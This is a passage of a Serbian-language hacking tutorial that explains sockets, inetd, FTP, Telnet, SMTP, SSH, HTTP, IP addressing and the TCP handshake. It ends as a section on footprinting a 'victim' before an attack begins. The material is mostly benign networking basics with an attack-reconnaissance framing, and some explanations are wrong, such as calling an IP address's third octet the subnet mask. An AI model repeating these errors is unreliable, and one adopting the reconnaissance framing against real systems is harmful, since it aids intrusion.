     [=- recv()        - Prima poruku na socketu
     [=- send()        - Salje poruku na socket
     [=- setsockopt()  - Postavlja socket opcije
     [=- shutdown()    - Gasi socket,moguce vise opcija
     [=- close()       - Zatvara socket
     [=- socketpair()  - Otvara par neimenovanih socketa
     
Da napomenem jos neke sitnice u vezi socketa.Kao npr da kada navodite adress do-
main morate znati da moze biti Internet ili UNIX domain.Mi cemo naravno najvise
koristiti Internet Domain.UNIX domain sluzi za povezovanje aplikacija u LAN-u 
ili na jednom racunaru,za razliku od Internet domaina koji kao sto mu i sama rec
povezuje preko Interneta i velikih mreza.

U primerima sam koristio use Socket;. Ovo znaci da ce nas program korsititi
biblioteku Socket koja dolazi u perl i koja sadrzi reference i osnovne definici-
je tvojih sistemskih mreznih sposobnosti. Na najnizem nivou mi smo korsitili
perlove ugradjene rutine koje su slicne sys pozivima u C.

     


   ==-[ 0x01d % Services get Naked
   
  U ovom tekstu opisati sve servise i njihovu ulogu bio bi Sizifov posao :).
Pokusacu da na sto bezbolniji nacin, ali i sto kraci da objasnim ulogu servisa,
tipove servisa itd.
Vecina UNIX servisa su obezbedjeni od strane individualnih programa koji se ces-
to nazivaju serverima. Da bi server mogao da radi kako treba mora mu se dodeliti
protokol,port i potrebno ga je naravno pokrenuti. Sto se tice protokola mogu se
dodeliti dva tipa TCP ili UDP.
ZNaci vecina servisa imaju sebi dodeljene portove, vecina njih radi na dobro po-
znatim portovima. Vec sam rekao sta su well-knowns portovi,tako da nebih opet da
ponavljam samo cu dodati da kada kada klijent preko mreze otvara konekciju na
serveru klijent korsiti port koji servis zeli.
UNIX sistemu kao bazu podataka o servisima i njihovim dodeljenim portovima,kao 
i o tipu konekcije (UDP ili TCP), drzi u fajlu /etc/services.

Primer,deo iz fajla /etc/services

   ==---------[code]----------==
   bash-2.05b# cat /etc/services | grep ssh
   ssh              22/tcp    #Secure Shell Login
   ssh              22/udp    #Secure Shell Login
   sshell          614/tcp    #SSLshell
   sshell          614/udp
   x11-ssh         6010/tcp   #Unofficial name, for convenience
   x11-ssh         6010/udp
   ==---------[/code]---------==
  
 Na ovom primeru vidimo 4 polja,stim sto je cetvrto opcionalno.
Prvo polje oznacava tip, ime servisa, drugo oznacava port koji je dodeljen servisu
,pored njega stoji tip konekcije TCP ili UDP, i na kraju komentar.

Vecina UNIX servera odredjuju svoj broj porta gledajuci u svaki port u fajlu
/etc/services uz pomoc sistemskog poziva getservbyname ( ).
Medjutim moze se desiti da serveri u svojim config fajlovima omogucavaju promenu
porta ili npr da server runuje na vise portova i sl.Da ne pricam o database
sistemima kao sto su NIS.DCE,NIS+ itd.

  Generalno servise mozemo podeliti na dve sort:
  
     [=- Servisi koji se startuju kada su potrebni - su oni servisi koji se obi-
         cno startuju od strane Internet super servera tj inetd.Oni na taj nacin
	 znacajno smanjuju opterecenost masine.
	 
     [=- Servisi koji su stalno pokrenuti - druhacije ih nazivamo daemonima.
         Obicno se dizu i ucitavaju sa dizanjem sistema, takodje obradjuju veliki
	 broj zahteva za konekcijama, rade u pozadini i osluskuju zahteve. Tako
	 imamo npr SSHD,nfsd itd.
	 
  Servise koji se dizu sa sistemom mozete naci u startup dirovima vasih sistema.
Kod mene je to npr direktorjijum /etc/rc.d u kome se nalaze startup scripte vise
daemona i inetd servera. Zeleo bih da ovde kazem jos koju rec o samom INETD.
  Inetd iliti internet superserver.je daemon koji upravlja nekim laksim inter-
net servisima,tj onim manje zahtevnim. On moze da osluskuje i prima konekcije na
bilo kom portu u bilo koje vreme. Kada primi konekciju on odmah startuje odgova-
rajuci server.
Inetd koristi za kacenje na portove bind() poziv koji sam vec opisao,i koristi
select() da bi odredio koji je od ovih portova primio konekciju.
Inetd-om mozete manipulisati preko njegovog konfiguracionog fajla, a to je
/etc/inetd.conf. On je uradjen na poseban nacin tj posebnom strukturom. Sastoji se
iz vise lako razumljivih polja koje cu malo pojasniti.

   [=- Service Name - Specificira ime servisa koje se pojavljuje u fajlu 
       /etc/services.inetd korsiti ovo ime da odredi na kom portu treba servis
       da slusa.
       
   [=- Socket Type  - Odredjuje dal servis radi sa stream ili datagram osnovama.
   
   [=- Protocol Type- Oznacava tip protokola. TCP ili UDP, ako se koristi TCP 
       onda je socket type stram, a ako je UDP onda je dgram tj datagram.
       
   [=- Wain/Nowait  - Ako je nowait server vrsi fork() i exec() novih server 
       procesa za svako primanje zahteva za konekciju. Ako pise wait server
       procesira sve konekcije koje prima na socket.
       
   [=- User         - Oznacava UID pod kojim ce se servis startovati.
   
   [=- Com name and - arguments.Komanda i argumenti koji se pokrecu.
   
   
  Ukoliko zelite da ugasite neki servis kojim upravlja inetd dovoljno je samo
da komentujete liniju pod kojom je dati servis. Komentar zadajete tako sto ispred
cele linije stavite #.

Primer:

   ==---------[code]----------==
   # Ident service is used for net authentication
   #auth   stream  tcp     wait    root    /usr/sbin/in.identd     in.identd
   ==---------[/code]---------==
   
 Kao sto vidimo kod mene je ispred auth servisa # sto znaci da se taj servis
nece pokretati,ukoliko bi zeleli da se pokrece potrebno je izbrisati # i rest-
artovati inetd. A to cemo uraditi na sledeci nacin.

   ==---------[code]----------==
   bash-2.05b# /etc/rc.d/rc.inetd restart
   ==---------[/code]---------==
   
 Zatim cemo imati i taj servis up. :P
 
Dacu jedan trik ukoliko zelite da vidite koji vam se servisi pokrecu pod inetd.

   ==---------[code]----------==
   bash-2.05b#  grep -v "^#" /etc/inetd.conf
   comsat        dgram   udp     wait    root    /usr/sbin/tcpd  in.comsat
   ==---------[/code]---------==
   
 Kod mene samo comsat :)
 
 Sada da se bacimo na posao objasnjavanja nekih servisa na koje cete cesto nal-
etati.


   ..[=-< FTP
   .
   .
   
  FTP ili File Transfer Protocl je nas dobri znanac. Dugo vremena je u upotrebi
medjutim jos mu se kraj ne vidi skoro. Iako su ga druge tehnologije presisale
on se neda ;).
FTO sluzi najprostije receno za prenos podataka sa jednog kompjutera na drugi.
Takodje moze sluziti i za sherovanje fajlova.
Kod FTP moramo razlikovati dva tipa konekcije:Data konekciju i Control konekciju

     [=- Control Con - preko ove konekcije se prenose samo komande,koje se mogu
         odnositi i na rad sa podatcima.
	 
     [=- Data Con    - preko ove konekcije se prenose podatci.
     
 Naravno FTP koristi TCP/IP protoko.
Takodje moze razlikovati dva tipa FTP, i tu podelu izvrsiti prema nacinu logova-
nja.
      [=- anonymous - ovakvi logini zahtevaju anonymous kao unos u polje user-a
          ,a za sifru se ostavlja zeljena e-mail adresa.
	  
      [=- Acc name  - Logovanje preko username koje vam je admin mreze dodelio.
      
 Kada se konektujes na neki ftp server, ti se konektuejs koristeci *PIPE*.
Taj pipe koristis samo ti, kada neko drugi zeli da se loguje na taj server on
korsiti drugi pipe. Pipe se pusta kada se prekida konekcija.
Zato ako dobijete poruku tipa "Broken PIPE", znate sta je u pitanju.
Inace FTP  korsiti port 21 za Control Connections, a port 20 za Data conections.
Navescemo primer konektovanja na jedan ftp server.

   ==---------[code]----------==
   ash-2.05b# ftp
   ftp> o
   (to) digital-phear.headcoders.net
   Connected to digital-phear.headcoders.net.
   220 ProFTPD FTP Server ready.
   Name (digital-phear.headcoders.net:root):
   ==---------[/code]---------==
   
  Iz datog primera jasno se vidi koji su koraci za uspostavljanje FTP sesije,
ostalo je samo da unesete vas username i password i ako je vas pristup odobren 
logovacete se na sistem.
Takodje mozete se logovati po sistemu.

   ==---------[code]----------==
   bash-2.05b# ftp headcoders.net 21
   ==---------[/code]---------==
   
  Mogli bismo da objasnimo i rad sa par FTP komandi,cisto da se snadjemo.
Imate potpune opise komandi u RFC FTp-a i u man stranicama. Ja cu navesti samo
neke osnovne

    [=- cd    -  change directory, komanda za rad sa dirovima, menja vas polozaj
         u navedeni direktorijum.
	 
    [=- get   - get imefajla,ce vam omoguciti da skinete taj fajla na vas sistem
     
    [=- put   - vam omogucava da uploadujete fajl na FTP server.
     
    [=- rename- menja ime fajla.
    
    [=- del   - brise imenovani fajl
    
    [=- mkdir - pravi novi direktorjium
    
    ]=- rmdir - brise navedeni dir
    
    [=- quit  - odloguje vas sa FTP servera
    
    [=- close - zatvara trenutnu FTP sesiju i vraca vas u FTP prompt.
    
    [=- pwd   - vam pokazuje u kom ste trenutno diru.
    
    [=- mput  - omogucava slanje vise fajlova odjednom
    
    [=- mget  - omogucava primanje vise fajlova odjednom
    
    [=- lcd   - kada vrsite get npr,fajlovi ce biti snimani u dir u kom ste bili
        kada ste startovali ftp.Uz pomoc lcd mozete promeniti taj dir.
	
    [=- bin   - Vrsi povlacenje podataka u 8-bit formatu, time se sprecaava
        koruptiranje doticnih.
	
  To bi trebalo da bude dovoljno za pocetak, uostalom to su komande koje se kor-
iste u 90% slucajeva kada krstarite nekim FTP serverom.

Postoji veliki broj FTP servera. O pojedinima cemo pisati u fazi skeniranja i 
otkrivanja rupa na sistemu. Svakako medju najpoznatijima su:

    [=- WU-FTPD   - je softver napravljen od strane Washington Univerziteta.
        Veoma je popularan daemon, pa mozda cak i najpopularniji.
	http://www.wu-ftpd.org/wu-ftpd-faq.html#IDX3 odlican FAQ
	
    [=- proFTPD   - Takodje veoma popularan FTP daemon,ciji su se tvorci potru-
        dili da isprave sve greske koje su uvideli u wuftpd kako bi proFTPD uc-
	inili sigurnijim.
	
   
   ..[=-< Telnet
   .
   .	 
   
  Heh ko jos nije cuo za Telnet.Nemorate biti kompjuterski mag da biste culi za
ovog dinosaurusa. Mnogi script kidozi i oni koji to tek postaju cesto na raznim
IRC sobama i forumima pitaju kako se to hakuje preko Telneta. To je jedna cesta
pojava prouzrokovana opstim nepoznavanjem materije.
  Njegova glavna uloga jeste da omogucava logovanje na udaljene sisteme.
Da biste uspesno izvrsili telnet sesiju potrebno je da imate telnet klijent i
telnet server. Telnet klijent ce biti na vasem racunaru sa koga zapocinjete kon-
ekciju dok se server nalazi na udaljenoj masini.
  Telnet kao i FTP sadrzi veliki broj komandi koje kontrolisu razne aspekte
interakcije sa klijentom.
Kada ste logovani na udaljeni sistem mozete raditi sve sto radite i na local 
sistemu.Osecaj je siti,kontrola je na vama.
  Telnet protokol takodje omogucava Network Virtual Terminal (NVT),kroz koje
korisnik moze da salje i prima podatke. Kod u NVT je cist ASCII.
7-bit kod se prenosi u 8-bit byte, posto je zadnji bit setovan na nulu.
Napomenucemo kao karakteristiku Telneta, da ce npr ESC taster biti tolerisan kao
ESCAPE signal, ukazujuci tako da ce sledeci karakter imati specijalno znacenje.
Svaki Telnet Control signal za ciji se kod mora biti poslat preko konekcije
bice prikazan u NVT kao osmobitni kod. Zadnji bit je setovan na 1.
  Malopre sam spomenuo NVT ali nisam objasnio sta je to.
Pa uz pomoc NVT i TCP/IP konekcija se i uspostallja.
Na klijentu Telnet program je odgovoran za prevod dolazecih NVT kodova, u kodove
koje display-device klijenta razume.
Takodje on prevodi kodove sa tastature u odlazece NVT kodove.
Vec sam pricao o 7-bit nacinu prenosa samo da dodam da na kraj linije tj
END OF LINE prenosi kao carrier return CR, pracen sa LF tj line feedom.

     NULL	         NUL	     0	Nema operacije
     Line Feed	         LF	    10	 premesta kursor u sledecu liniju
     Carriage Return	 CR	    13	 pomera kursor na levu marginu,u liniji
     
  Ovo su control kodovi,naravno nisam naveo sve.
  
Komande se takodje prenose u 8-bit formatu stim sto je zadnji bit zero tj 0.

Medjutim nemora striktno TELNET sluzati za remote login, njegovu namenu u potp-
unosti moze odrediti admin servera. Preko njega se moze pristupiti i ostalim 
servisima. Telnet po defaultu slusa na portu 23.
Uspostavljanje telnet sesije se vrsi:

    ==---------[code]----------==
    bash-2.05b# telnet localhost 
    Trying 127.0.0.1...
    Connected to localhost.
    Escape character is '^]'
    ==---------[/code]---------==
    
  
    
   ..[=-< SMTP Protocol
   .
   .
  
  SMTP Protokol se odnosi na mail transfer protokol.
SMPT je skracenica od Simple Mail Transfer Protocol .
Uz pomoc ovog protokola odvija se najvazniji deo jednog e-mail procesa, a to je
dostava maila od posaljioca do primaoca.
Dostavka maila putem SMTP ukljucuje regularnu razmenu e mail poruka izmedju 
SMTP servera. SMTP server je odgovoran za slanje e maila koga user napise i spr-
emi za dostavu. Ali oni ne radi samo to vec su zaduzeni i da primaju mailove koji
su namenjeni lokalnim primaocima pa ponekad i dalje prosledjuju mailove na dru-
ga mesta.
Komunikacija SMTP servera se zasniva na TCP protokolu.
Time se obezbedjuju uslovi da se mail uspesno dostavi na krajnju adresu.
Medjutim SMTP server mora biti 24h online sto predstavlja nekima teskoce,zbog 
toga vecina krajnjih korisnika korsiti protokole kao sto su POP3.
SMTP osluskuje na portu 25.
SMTP koji zeli da posalje e-mail, pocinje sa DNS lookupom MX zapisa (recorda),
koji odgovara imenu domene kako bi se dobilo ime SMTP servera.To ime se prevodi
u IP adresu.SMTP posaljioc zatim uspostavlja sesiju sa SMTP primaocem, a kada
se veza uspostavi moze se izvrsiti prenos maila. Zatim posaljioc ubija konekciju.
SMTP posaljioc primaocu salje ECHO ili HELLO komandu na koju primaoc odgovara.
PRenos tj transfer se odvija u 3 koraka:

    [=- SMTP posaljioc daje na znanje primaocu da zeli da posalje poruku i pri-
        maocu daje email adresu posaljioca.
	
    [=- Posaljioc daje e mail adresu primaoca ili vise njih.
    
    [=- Posaljioc salje e mail primaocu.
    
  Ukoliko je pokrenut SMTP server moze se telnetovati na njega.
 
    ==---------[code]----------==
    bash-2.05b# telnet 127.0.0.1 25
    Trying 127.0.0.1...
    Connected to 127.0.0.1.
    Escape character is '^]'.
    ==---------[/code]---------==
    
  Na ovaj nacin npr mozemo fekovati mail, medjutim to ne zelim sada navoditi.
Nadjite druge izvore za to :).
Najpoznatiji SMTP server je svakako SENDMAIL.
On je najrasprostranjeniji, ali je ujedno i pojam za nebezbednost sistema.
Veliki broj rupa koje se pronalaze gotovo svakog meseca uticu na to da je cesta
meta hakera.



   ..[=-< IMAP & POP
   .
   .
  
  IMAP i POP su takodje MAIL protokoli,koji omogucavaju korisnicima da vrse ud-
aljeni pristup e-mailu. Hakeri cesto koriste ove protokole jel FW dopustaju tr-
ansport kroz njih.Iako su njihove rupe opstepoznate, jedini nacin zastite je 
patchovanje i instaliranje najnovije verzije.
POP je skracenica od Post Office Protocol.Trenutno je u opticaju verzija 3.
Kako radi POP3?
Korisnik poziva POP3 klijent koji otvara TCP konekciju ka POP3 serveru,tamo gde
je mailbox. Korisnik prvo salje username i password kako bi izvrsio identifikac-
iju. Kada se identifikacija uspesno izvrsi korisnicki klijent salje komande ser-
veru kako bi izvrsio kopiranje poruka, a zatim i njihovo brisanje sa servera.
Na tim serverima je instaliran i SMTP naravno koji je tu da prima mailove.
Znaci SMTP prihvati poruku i smesta je u mailbox, dok POP3 omogucava krajnjem ko-
risniku da cita te poruke, brise itd.

IMAP je skracenica za Internet MEssage Access Protocol.
To je protokol za pristup mailovima sa vaseg lokalnog servera.
Zadnja verzija je IMAP4,i sadrzi klijent/server protokol. Tako da se uz pomoc
IMAP-a mozete primati poruke, citati,brisati itd.




   ..[=-< NFS
   .
   .
   
 NFS je skracenica od Network File System.
Prozivod je Sun Microsystems-a,i ima ulogu u obezbedjivanju mreznog sherovanja
fajlova.
Mehanizam pristupa fajlovima prihvata zahteve i automatski ih prosledjuje
lokalnom fajl sistemu ili NFS klijentu,a to zavisi da li je fajl na lokalnoj
masini ili na remote. Kada NFS klijent primi zahtev on koristi NFS protokol
da kontaktuje odgovarajuci server na remote masini, kada server odgovori klijent
dobija rezultate pokrenute aplikacije.
Znaci uz NFS vam omogucava da vise korisnika simultano dele fajlove medju sobom.
NFS se sastoji od tri sloja tj tri komponente.

    [=- RPC   - udaljeno pozivanje usluga. Proizvod Sun Microsystemsa.On impleme-
        ntira klijent/server mreznu komunikaciju. Medjutim RPC je smatran veoma
	ranjivim i cesto ga se treba kloniti.
	
    [=- XDR   - je jezik koji omogucava da se fajlovi prenose preko NFS i skla-
        diste koristeci razlicite metode.
	
    [=- NFS p - NFS procedures & Operations,korsiti RPC za prenos komandi preko
        mreze,i XDR za prenos fajlova preko mreze.
	
  To su samo par osnovnih pojmova vezanih za NFS, ipak tematika je prevelika kako
vi sada o tome pricao.


   ..[=-< SSH
   .
   .
   
  Protokol buducnosti,protokol koji bi trebao da smeni nesigurne protokole poput
FTP ili telneta.SSH je skracenica od Secure Shell.
SSH ima istu ulogu kao npr telnet, a to je logovanje na remote masine.Osecaj pri
radu je identican onome na local masini. SSH je sigurniji od navedenih protokola
iz tog razloga sto poslate podatke enkriptuje. Dok npr TELNET svoje podatke salje
u plain text formatu, sto znaci da se i sifre salju istim principom tako da je 
lako izsnifati sifru.
Cim podatci stizu do usera odmah se dekriptaju tako da korisnik nije ni svestan
sta se desava i to kriptovanje ga uopste ne ometa u radu.
SSH ima klijent/server arhitekturu.

   [=- Server  - Pokrece se od strane sysadmina. Sluzi za prihvatanje i odbijanje
       konekcija na host na kom je server dignut. SSHD je naziv za SSH daemon
       koji se po defaultu startuje sa sistemom.
       
   [=- Klijent - Omogucava konektovanje na server, preko SSH protokola. Ta komu-
       unikacija se kao sto rekoh enkriptuje zbog sigurnosti.
       
  SSH nije command interpreter kao sto su to shellovi tipa bash, tcsh itd. On ne 
poseduje history mehanizam zatim wildcardse i slicne odlike klasicnih shellova.
On u stvari otvara kanal za pokretanje shella na udaljenom racunaru.
SSH protokol obuhvata:
   
    [=- Authentication - identifikacija usera,jel samo useri koje admin dozvoli
        mogu se logovati na sistem u suprotnom SSH odbija konekciju. Takodje
	user mora dokazati da je bas on taj kome je dozvoljen pristup sistemu,
	a to se izvodi na vise nacina.
	
    [=- Encryption     - Stiti vase podatke koje se prenose preko mreze tako sto
        ih kriptuje.
	
    [=- Integrity      - Garantuje da ce vasi podatci stici,u onom stanju u kom
        su i poslati.
	
  Sta SSH moze da radi?? tj sta uz pomoc njega vi mozete da radite?
Mozete se npr na siguran nacin logovati na udaljenu masinu i to se naziva - Sec-
ure remote logins.
Primer:
 
   ==---------[code]----------==
   bash-2.05b# ssh -l blood tesla.rcub.bg.ac.yu
   blood@tesla.rcub.bg.ac.yu's password:
   ==---------[/code]---------==
   
 Kada ukucate i password koji ste izabrali ili koji vam je admin dodelio, uspesno
cete se logovati na sistem. Svi ti podatci koje ste uneli ce biti enkriptovani 
tako da nema straha od snifanja i sl tehnika skupljanja podataka.
Koristili smo -l argument kako bi naveli ime usera, pod kojim cemo se logovati
na sistem, posle toga smo naveli ime hosta na koga se logujemo.

Uz pomoc SSH moze izvrsiti i prenos fajlova na veoma siguran i pouzdan nacin i 
to koristeci Secure File Transfer.

    ==---------[code]----------==
    scp fajl blood@host.com:
    ==---------[/code]---------==
    
  Postupak prenosa fajlova je takodje siguran jel se fajlovi enkriptuju.
  
 Jos jedan bitan features SSH su Keys & Agents.
Posto SSH ima vise mehanizama identifikacije korisnika ovo je takodje jedan od
nacina koji je cek sigurniji nego mahanizam identifikacije uz pomoc sifre.
Zamislite npr da imate dosta ssh naloga i da nemozete pamtiti sve te sifre, a st-
avljanje iste sifre nije preporucljivo iz bezbednonosnih razloga.

  Kljuc je mali skup bitova koji identifikuje korisnika.Iz sigurnosnih razloga
kljucevi se cuvaju enkriptovani i koriste se tek posle unosenja tajne parafraze
koju definise korisnik. Posle unosenja parafraze vrsi se dekriptovanje. U saradnji
sa Agentima kljucevi mogu lako da indetifikuju identitet korisnika.

Navescemo jos jednu dobru stranu SSH, a to je tzv PORT FORWARDING,uz pomoc kog
i neke nesigurne apliakcije tipa TELNET mogu postatisigurnije.
Ova tehnika se jos naziva i Tunelovanje. Sustina je u tome da se TCP/IP konekcija
preusmerava tj rutira kroz SSH radi enkriptovanja i drugih sigurnosnih mera.
Navescemo primer.

   ==---------[code]----------==
   ssh -L 6000:localhost:119 news.target.com
   ==---------[/code]---------==
   
  Sta smo uradili ovim nizom naredbi.Pa rekli smo SSH da preko lokalnog porta
6000 uspostavi konekciju na udaljenoj masini www.target.com na portu 119.
Znaci izvrsili smo pristup koji inace bi mogao biti uskracen putem FW ili rutera
i sl, ali posto je SSH siguran protokol onda ... :)

SSH klijent sadrzi veliki broj opcija za rad sa njim tako da je najbolje da ...
RTFM.

Ja cu navesti jos par korisnih trikova,koje mozete korsititi.

   ==---------[code]----------==
   $ ssh -e "$" -l blood shell.moj.com
   ==---------[/code]---------==
   
  Ovim cemo omoguciti da nam ESCAPE karakter posle logovnja bude znak $.
  
 Ako ste se vec navikli na FTP onda mozete koristiti SFTP protokol koji nam don-
osi SSH.

    ==---------[code]----------==
    usage: sftp [-vC1] [-b batchfile] [-o option] [-s subsystem|path] 
    [-B buffer_size] [-F config] [-P direct server path] [-S program]
    [user@]host[:file [file]]
    ==---------[/code]---------==
   
  Naravno da je SFTP sigurniji od obicnog FTP, iz razloga sto donosi enkripciju
podataka koji se prenose preko mreze. Takodje sigurniji je usled toga sto koristi
sigurnosne SSH kanale za prenos podataka.

Ako ste se navikli na rlogin mozete korsitit slogin, koji takodje donosi SSH.

Takodje uz pomoc SSH mozete pozvati i pokrenuti programe kao da sedite
za tastaturom na tom sistemu.

   ==---------[code]----------==   
   # ssh -l remoteuser remotehost who
   ==---------[/code]---------==
  
 Znaci da bi ova komanda imala efekta navescemo ime usera na ciji account zelimo
da se logujemo zatim ime hosta na koji se logujemo i na kraju komandu koju zeli-
mo da izvrsimo.
Ako su u pitanju interaktivne komande dodacemo switch -t.

   ==---------[code]----------== 
   # ssh -l -t remoteuser remotehost pico
   ==---------[/code]---------==   

 A sada cemo navesti nacin identifikacije putem JAvog kljuca i to za openSSH
protokol.
Pratite sledece korake.

   ==---------[code]----------== 
   # mkdir -p ~/.ssh                        If it doesn't already exist
   # chmod 700 ~/.ssh
   # cd ~/.ssh
   # ssh-keygen -t dsa
   ==---------[/code]---------== 
   
  Kada smo izvrsili ove korake potrebno je da kopiramo taj public key na remote
host:

   ==---------[code]----------==
   # scp -p id_dsa.pub blood@target.com:
   Password: ********
   ==---------[/code]---------== 
   
 Zatim cemo se logovati na remotehost i tamo instalirati public key.
   
 $ ssh -l remoteuser remotehost
Password: ******** 

   ==---------[code]----------==
   target# mkdir -p ~/.ssh                      
   target# chmod 700 ~/.ssh
   target# cat id_dsa.pub >> ~/.ssh/authorized_keys   
   target# chmod 600 ~/.ssh/authorized_keys
   target#mv id_dsa.pub ~/.ssh                  
   target#logout
   ==---------[/code]---------== 
   
 Sada se ponovo mozemo logovati na sistem koristeci javni kljuc:

   ==---------[code]----------== 
   # ssh -l remoteuser remotehost
   Enter passphrase for key '/home/blood/.ssh/id_dsa': ****************   
   ==---------[/code]---------== 
  
  Voila zaboravite na sifre :)
     
Vreme je da saznate kako se mozete logovati na sistem bez sifre ili parafraze.

   ==---------[code]----------== 
   # eval `ssh-agent`
   # ssh-add
   Enter passphrase for /home/blood/.ssh/id_dsa: ********
   ==---------[/code]---------== 
   
 Toliko o SSH, ipak i SSH je prevelik zalogaj da bi se sada objasnjavao u necemu
kao sto je tutorial. Ipak za to treba jedna obimnija knjiga.



   ..[=-< HTTP
   .
   .
   
  Svaki web server i browser komuniciraju preko HTTP protokola.
Znaci preko HTTP porta ce se vrsiti ta razmena informacija.
Trenutno se korsiti 1.1 verzij HTTP protokola.
Inace HTTP radi po principu zahteva/odgovora, znaci nacrtacemo jedan primer kako
to izgleda u stvarnosti.


   __________                   ___________
   |        | ----------------> {         |
   | Klijent|                   | Server  |
   |________| <---------------- |_________|
   
  Klijent serveru salje niz zahteva kao i request header,a HTTP server klijentu
  vraca HTTP response code koristeci te requested headere.   
  
  HTTP protokol omogucava slanje,prosledjivanjem, primanje informacija.
Sada cemo malo objasniti arhitekturu HTTP protokola i kako sve to skupa radi.

   [=- ZAHTEV - (request),prvi korak zahteva jeste da odluci koju ce metodu kor-
       istiti Pa tako imamo:
       --GET - povlaci informaciju koja se zahteva sa sistema.Ukoliko se npr 
               radi o HTML strani odmah je prikazuje u browseru,medjutim ako se
	       radi o npr ASP strani web server procesira taj fajl i izvrsava i
	       izvrsava njegovu komandu, zatim output salje browseru.
	       
       --HEAD- je slican GET medjutim on ne vraca podatke browseru. Ali on salje
               output response koda, date headera,server headera itd.
	       
       --POST- koristi se najvise u sklopu sa CGI. Ovaj metod zahteva od servera 
               da prihvati informacije i deluje na njih.
	       
	       
   [=- ODGOVOR - Kada server primi zahtev on salje veci broj poruka kao odgovor.
                 Odgovor se sastoji iz 3 dela:
        --Response code - numericki kod koji odgovara zahtevu
	--Header fields - dodatne informacije o odgovoru
	--Data          - sadrzaj tj telo (body) odgovora.
	
 Ako ste ikada posetili stranicu na kojoj pise npr "ERROR 404,NOT FOUND", to vam
je RESPONSE code.Necu navoditi sada svaki response code, jel to mozete sami savl-
adati.
   Kako pominjati HTTP bez web servera koji i korsite HTTP protokol.
WEB serveri sluze da obezbede mogucnost pristupa web lokaciji tj stranici.
Server odgovara na zahteve pojedinacnih citaca,koji se ponasaju kao klijenti 
naspram servera.
Najpoznatiji je svakako *APACHE* dok za windozu *IIS*.Cesto se defaceri
i oni koje to zele da bude zanimaju i bakcu oko Apache vulnova koji ce
im omoguciti da haknu serv,mada se to moze izvesti na 100000 nacina.
Poznati su veoma i Apache i IIS bugovi i rupe koje su hakeri
tokom godina uspesno iskoriscavali /"setite se slavnog UNICODE buga/"
Apache je malo teze konfigutisati, i moze se naci i na UNIX ali i na Win masini.
Ako nor kod sebe instalirate apache i dignete ga uradite neki sajt
smestite ga u htdocs dir bilo ko sa kucanjem vase ip adrese
moze pristupiti vasem radu.
Tu je za UNIX i boa web server koji je mali i brz.
Znaci postoji veci broj Servera medjutim u opstoj primeni se nalaze u 90% sluc-
ajeva IIS i Apache.
 Port na kom slusaju web serveri su: 80 i 8080 mada se to lako
moze izmeniti u conf fajlovima.  

  Navescemo jedan primercic kako sve to skupa radi i kako se bash ta stranica
koju ste vi zahtevali pojavi na monitoru.
Znaci kao sto smo napomenuli BROWSER salje GET zahtev web serveru i od njega 
trazi zeljenu stranicu.Browser direktno kontaktuje server>Browser pocinje sa URL
,ekstraktucuji hostname deo  i korsiti DNS da izvrsi prevod u IP adresu,onda se
ostvaruje TCP konekcija klijenta sa serverom. Znaci uspostavlja se veza izmedju
web servera i Browsera i oni sada koriste HTTP protokol za komunikaciju.
Zatim kada browser uputi zahtev za primanje stranice web server salje kopiju 
stranice browseru. Radi ubrzanja ucitava browseri koriste cache u kom smestaju
kopije stranica.....


   
   
   
   ==-[ 0x01e % coMMon thingZ
   
Posto je ovo zadnje poglavlje navescemo jos par osnovnih stvari koje bi trebalo
da znate.    
Sta je ta IP adresa???
Kao sto svako od nas ima npr broj telefona preko koga nas neko moze naci tako i 
racunari imaju svoja imena tj brojeve preko cega se identifikuju i prepoznaju.
To je decimalna notacija 32-bitne  Internet adrese podeljenih u 8-bitna polja.

  Znaci IP adresa izgleda npr ovako:  212.125.23.7
Mnogi misle da ovi brojevi oznacavaju drzavu i grad gde
se korisnik nalazi . to je pogresno.

Prvi broj tj 212 se naziva *Network prefix* i indetifikuje mrezu
u kojoj je host.
Drugi broj se naziva *host number* i identifikuje hosta u mrezi.
Naravno da ce u istoj mrezi Network number biti isti.
Postoje klase IP adresa i to tri A,B,C:

class A { /8 prefix}      od 1.xxx.xxx.xxx do 126.xxx.xxx.xxx
class B { /16 prefix}     od 128.xxx.xxx.xxx do 191.255.xxx.xxx
class C { /24 prefix}     od 192.0.0.xxx do 223.255.255.xxx

Treci broj je *subnet mask*. Sto znaci ako idete preko jednog *ISP*
(Internet Service provider), imacete uvek iste prva tri polja
tj xxx.yyy.xxx, znaci network prefix, host,number,subnet mask
,a zadnji broj ce se menjati jer je varijabla. Medjutim naravno
da ISP moze da otkupi vise blokova i tako ce se menjati i subnet.

  Mozda neko nezna cija je adresa 127.0.0.1,e pa to je *localhost*
tj *loopback interface*. Znaci to je adresa vaseg sistema koja sluzi u razlicite
svrhe.I kada se online i kada ste offline uvek imate lo. Svaki sistem ima iden-
ticnu adresu tj lo.


---Kako se uopste odvija konekcija dva racunara---
Nacin koji cu vam opisati se naziva na eng *three way handshake*
tj trostepeni hendsejk. On se odvija na sledeci nacin.

Racunar A salje paket sa SYN flagom (synhronize) drugom racunaru sa kojim
          zeli da uspostavi konekciju tj racunar B.
	  
Racunar B ukoliko servis slusa na kontaktovanom portu vraca racunaru A
          paket sa SYN/ACK flagom za potvrdu konekcije. A salje i SYN
	  i ocekuje potvrdu A racunara ...za konekciju
	  
Racunar A salje opet ACK paket, kao odgovor na SYN paket racunara B, i veza
          se uspostavlja.
	  
Tu je je i RST oaket koji moze biti poslat u bilo kom trenutku od bilo
         koje strane i oznacava prekid konekcije.
	 
Postoji i FIN paket koji se salje kada jedna strana zavrsi sa komunikacijom.

  ...._Eto u par redova sam objasnio neki minimalizam sto se tice uspostavljanja
       veze, ali to je zaista minormno u odnosu na velicinu materije u toku txt
	bice jos takvih stvari za pocetak dovoljno.._




  
--==<[ 0x02 %  System eXposed
      \______________________/ 
      
      

   ==-[ 0x02a % Footprinting
   
  Veoma vazna metoda u procesu skupljanja informacija.
Ali da nesto razgranicimo ja sam ceo ovaj tutorial nazvao -=The art of footpri-
nting=- iako se samo jedam majusan deo u sustini zasniva na njemu. Neznam nisam
mogao naci bolji naziv za tutorial pa sam skeniranje, popisivanje i sve ostale
metode strpao u jedan kos.
  Ukoliko zelimo da izvedemo precizan napad moramo se dokopati sto vise inform-
acija onoliko koliko je to moguce. Kao sto napomenuh na pocetku INTERNET je pun
informacija samo ih treba naci i iskorsititi na pravi nacin.
Vazno je napraviti /*FOOTPRINT*/ tj otisak Zrtve.On se sastoji od svih informa-
cija koje ste mogli da prikupite. Uz pomoc tog snimka mozete izvrsiti savrsen 
napad onda kad vama toodgovara. Sistematsko popisivanje i skupljanje informacije
